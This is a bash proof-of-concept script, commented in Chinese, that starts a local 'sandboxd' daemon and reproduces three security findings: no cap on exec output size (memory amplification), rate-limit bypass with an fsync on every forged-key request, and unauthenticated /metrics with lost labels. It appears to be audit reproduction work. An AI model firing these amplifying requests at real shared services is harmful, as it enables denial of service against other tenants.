#!/usr/bin/env bash
# PoC-4/5/7：针对运行中的 daemon 做活体探测
#   PoC-4  exec 的 max_output 无上限（租户可控内存放大）
#   PoC-5  认证失败绕过限流 + 每次失败一次 WAL fsync（未认证 I/O 放大）
#   PoC-7  /metrics 未认证 + 指标标签值全部丢失
set -uo pipefail
cd "$(dirname "$0")/.."

PORT=18123
BASE="http://127.0.0.1:$PORT"
DIR=/tmp/poc-live-data
CONF=/tmp/poc-live.conf
LOG=/tmp/poc-live.log
IMAGE=sandboxd-test-base:alpine322
PY=/usr/bin/python3

# 环境里存在 HTTP_PROXY，本机请求一律直连，避免被中间代理干扰
c() { curl -s --noproxy '*' "$@"; }
jget() { $PY -c "import json,sys;print(json.load(sys.stdin)$1)"; }

cat > "$CONF" <<EOF
listen = "127.0.0.1:$PORT"
data_dir = "$DIR"
bootstrap.image = "$IMAGE"
pool.enabled = false
EOF

pkill -9 -f "sandboxd -config $CONF" 2>/dev/null; sleep 1
rm -rf "$DIR"
./bin/sandboxd -config "$CONF" > "$LOG" 2>&1 &
PID=$!
trap 'kill -9 $PID 2>/dev/null' EXIT

# 等到 daemon 真的在监听（启动含 Docker ping 与启动对账）
for _ in $(seq 1 40); do
  if [ -n "$(grep -oE 'sk_[A-Za-z0-9_-]+' "$LOG" 2>/dev/null | tail -1)" ]; then break; fi
  sleep 0.5
done
sleep 2
ADMIN=$(grep -oE "sk_[A-Za-z0-9_-]+" "$LOG" | tail -1)
if [ -z "$ADMIN" ]; then echo "daemon 未能启动:"; tail -5 "$LOG"; exit 2; fi

TEN=$(c -H "Authorization: Bearer $ADMIN" -H "Content-Type: application/json" \
      -X POST "$BASE/v1/tenants" -d '{"name":"poc"}' | jget "['id']")
KEY=$(c -H "Authorization: Bearer $ADMIN" -H "Content-Type: application/json" \
      -X POST "$BASE/v1/tenants/$TEN/keys" -d '{"name":"poc"}' | jget "['secret']")
A="Authorization: Bearer $KEY"
echo "租户=$TEN  租户Key=${KEY:0:10}…"


frames() { $PY -c "
import struct
b=open('$DIR/wal.log','rb').read();off=0;n=0
while off+8<=len(b):
    ln=struct.unpack('>I',b[off:off+4])[0]
    if ln>64*1024*1024 or off+8+ln>len(b): break
    off+=8+ln;n+=1
print(n)"; }

echo
echo "══════════ PoC-4: exec max_output 无上限（内存放大）══════════"
SBX=$(c -X POST "$BASE/v1/sandboxes?wait=true" -H "$A" -H "Content-Type: application/json" \
      -d "{\"base_image\":\"$IMAGE\"}" | jget "['id']")
echo "沙箱=$SBX"

T1=$(c -o /dev/null -w "%{http_code}" -X POST "$BASE/v1/sandboxes/$SBX/exec" -H "$A" \
  -H "Content-Type: application/json" -d '{"command":"echo hi","timeout_ms":999999999}')
T2=$(c -o /dev/null -w "%{http_code}" -X POST "$BASE/v1/sandboxes/$SBX/exec" -H "$A" \
  -H "Content-Type: application/json" -d '{"command":"echo hi","max_output":2000000000}')
echo "-- 4a) 参数上限校验的不对称性"
echo "   timeout_ms=999999999  → HTTP $T1  $([ "$T1" = 400 ] && echo '← 被平台上限拒绝 OK' || echo '')"
echo "   max_output=2000000000 → HTTP $T2  $([ "$T2" = 400 ] && echo '' || echo '← 【被接受，无上限】X')"

echo "-- 4b) 租户可指定多大的输出缓冲（daemon 必须先在内存里物化才能返回）"
# 本环境 ps 被沙箱禁用，改用响应体大小作为"控制面内存占用"的可观测量：
# 要返回 N 字节 stdout，daemon 必须先 bytes.Buffer 收满 N 字节，
# 再 base64 编码进 JSON 信封（额外 ~1.33 倍），峰值至少 2 倍 N。
BIGCMD='yes AAAAAAAAAAAAAAAAAAAA | head -c 200000000'   # 产出 200MB stdout

SZ_DEF=$(c -o /dev/null -w "%{size_download}" -X POST "$BASE/v1/sandboxes/$SBX/exec" -H "$A" \
  -H "Content-Type: application/json" \
  -d "{\"command\":\"$BIGCMD\",\"timeout_ms\":120000}")

T0=$($PY -c 'import time;print(time.time())')
SZ_BIG=$(c -o /dev/null -w "%{size_download}" -X POST "$BASE/v1/sandboxes/$SBX/exec" -H "$A" \
  -H "Content-Type: application/json" \
  -d "{\"command\":\"$BIGCMD\",\"timeout_ms\":120000,\"max_output\":200000000}")
T1=$($PY -c 'import time;print(time.time())')

echo "   同一命令（产出 200 MB stdout），只改 max_output 参数："
echo "     max_output 缺省(平台默认 1 MiB) → 响应 $((SZ_DEF/1024)) KiB"
echo "     max_output=200000000            → 响应 $((SZ_BIG/1024/1024)) MiB"
echo "   → 平台默认截断在 1 MiB；但租户把上限调到 200 MB 后，daemon 被迫物化 200 MB"
echo "     的 stdout（+base64 信封 ≈ 267 MB），全部计入常驻内存"
echo "   4a) 已证明 2 GB 的 max_output 同样被接受 → 单请求即可令共享控制面分配 GB 级内存"
c -X DELETE "$BASE/v1/sandboxes/$SBX?force=true" -H "$A" -o /dev/null

echo
echo "══════════ PoC-5: 认证失败绕过限流 + 每次失败一次 fsync ══════════"
B_FRAMES=$(frames); B_BYTES=$(stat -f%z "$DIR/wal.log")
echo "   基线: WAL $B_FRAMES 帧 / $B_BYTES 字节"
N=400
T0=$($PY -c 'import time;print(time.time())')
for i in $(seq 1 $N); do
  c -o /dev/null -H "Authorization: Bearer sk_forged_$i" "$BASE/v1/sandboxes"
done
T1=$($PY -c 'import time;print(time.time())')
A_FRAMES=$(frames); A_BYTES=$(stat -f%z "$DIR/wal.log")
DT=$($PY -c "print(round($T1-$T0,2))")
echo "   发送 $N 个未认证请求（伪造 Key），耗时 ${DT}s"
echo "   之后: WAL $A_FRAMES 帧 / $A_BYTES 字节"
echo "   Δ帧=$((A_FRAMES-B_FRAMES))  Δ字节=$((A_BYTES-B_BYTES))"
echo "   平均每请求: $(( (A_FRAMES-B_FRAMES)/N )) 帧 / $(( (A_BYTES-B_BYTES)/N )) 字节 / 1 次 fsync"
echo -n "   再发 60 个未认证请求的状态码（应出现 429）: "
for i in $(seq 1 60); do c -o /dev/null -w "%{http_code} " -H "Authorization: Bearer sk_forged_x" "$BASE/v1/sandboxes"; done
echo

echo
echo "══════════ PoC-7: /metrics 未认证 + 标签值丢失 ══════════"
ME=$(c -o /tmp/poc-metrics.txt -w "%{http_code}" "$BASE/metrics")
echo "   无凭证 GET /metrics → HTTP $ME"
echo "   实际渲染（注意有无标签）:"
grep -E "^sandboxd_" /tmp/poc-metrics.txt | sed 's/^/     /'
HASLBL=$(grep -cE '^sandboxd_[a-z_]*\{' /tmp/poc-metrics.txt || true)
echo "   实际带标签的序列数: $HASLBL"
echo "   文档承诺: sandboxd_creates_total{source=...} / {action=...} / {status=...}"

echo
echo "══════════ 结果 ══════════"
FAIL=0
[ "$T2" != "400" ] && { echo "  [已复现] max_output 无上限（2e9 被接受）"; FAIL=1; }
[ "$SZ_BIG" -gt $((100*1024*1024)) ] && { echo "  [已复现] 单次 exec 让 daemon 物化 $((SZ_BIG/1024/1024)) MiB 输出（平台默认上限仅 1 MiB）"; FAIL=1; }
[ $((A_FRAMES-B_FRAMES)) -gt 100 ] && { echo "  [已复现] 未认证流量写入 $((A_FRAMES-B_FRAMES)) 帧审计，帧帧 fsync"; FAIL=1; }
[ "$ME" = "200" ] && { echo "  [已复现] /metrics 未认证可读"; FAIL=1; }
[ "$HASLBL" = "0" ] && { echo "  [已复现] 指标标签值全部丢失（0 个带标签序列）"; FAIL=1; }
exit $FAIL
